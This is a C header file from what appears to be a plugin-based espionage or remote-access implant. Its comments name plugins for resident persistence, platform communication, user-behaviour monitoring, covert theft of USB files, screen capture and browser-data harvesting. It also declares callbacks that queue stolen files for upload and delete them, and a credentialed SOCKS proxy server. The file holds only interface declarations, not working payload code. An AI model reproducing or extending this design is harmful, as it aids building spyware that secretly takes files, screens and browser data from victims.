/**************************************************************
 * Module:
 *        T5common.h
 *
 * Author:
 *        DING ZhaoKun (dzkad@hotmail.com)
 *
 * Time:
 *        2010-7-8, Nanjing
 *
 * Notes
 *		  T5团队开发共用头文件
 *
 */

#ifndef _TJ_T5_DZK_COMMON_H_
#define _TJ_T5_DZK_COMMON_H_

#ifdef __cplusplus
extern "C" {
#endif //__cplusplus

// 所有的落文件的数据结构中，必须增加魔术数
//
#define T5_FILE_MAGIC				0xA9B8C7D6

#define MAX_PLG_COUNT				(32)
#define MAX_PLG_CFG_LEN				(8192)

// 全屏事件
//
#define CAP_SCREEN_EVENTNAME		"Global\\{EED5CA6C-9958-4611-B7A7-1238F2E1B17E}"

// 为了省去命名的烦恼，这里采用了简单的命名规则
//
#define PLUGIN_ZERO                 (0)                 // 驻留插件
#define PLUGIN_ONE					(1)					// 平台通信插件
#define PLUGIN_TWO					(2)					// 用户行为监控插件	
#define PLUGIN_THREE				(3)					// USB文件密取插件
#define PLUGIN_FOUR					(4)					// 屏幕监控插件
#define PLUGIN_FIVE					(5)					// 浏览器信息获取插件

// SetCallbackInterface是各功能插件必须开放的函数，其函数原型如下所示
// 参数说明：
//		lpcbInterface	 - 回调函数指针数组
//								1. CbGetPluginCfgData			[需要检查和释放返回值]
//								2. CbSetPluginCfgData			
//								3. CbGetFileSaveDirectory		[调用者提供存放路径的BUFFER]
//								4. CbAddUploadFileTask			[调用结束后，参数lpwzFilePath可以正常释放]
//								5. CbIsBelowDiskSpaceLimit		[返回TRUE，说明空间已经不足了]
//
//		dwInterfaceCount - 回调函数接口数量
//

typedef VOID  (WINAPI *SETCALLBACKINTERFACE)(PVOID lpcbInterface[], DWORD dwInterfaceCount);
					   
// 下面两个函数是由各功能插件进行调用，其函数指针的声明如下所示
//
typedef PBYTE (WINAPI *CBGETPLUGINCFGDATA)(DWORD	dwPlgId, DWORD	&dwDataLen);								// 获取插件配置数据
typedef BOOL  (WINAPI *CBSETPLUGINCFGDATA)(DWORD	dwPlgId, PBYTE lpbyData, DWORD dwDataLen);					// 设置插件配置数据
typedef BOOL  (WINAPI *CBGETFILESAVEDIRECTORY)(DWORD dwPlgId, PWCHAR lpwzBuffer, UINT uSize);					// 获取文件存放目录，插件DLL可以在该目录下按需存储或新建目录存储文件
typedef BOOL  (WINAPI *CBADDUPLOADFILETASK)(DWORD dwPlgid, PWCHAR lpwzFilePath, BOOL bDelFileAfterFinished);	// 增加一个回传的文件任务
typedef BOOL  (WINAPI *CBISBELOWDISKSPACELIMIT)();																// 判断是否磁盘空间低于最低值

// 插件5
//
typedef bool (WINAPI *STARTSOCKSSERVER)(unsigned short nPort, PCHAR lpszUser, PCHAR lpszPass);
typedef void (WINAPI *STOPSOCKSSERVER)();

#ifdef __cplusplus
}
#endif // __cplusplus

#endif // _TJ_T5_DZK_COMMON_H_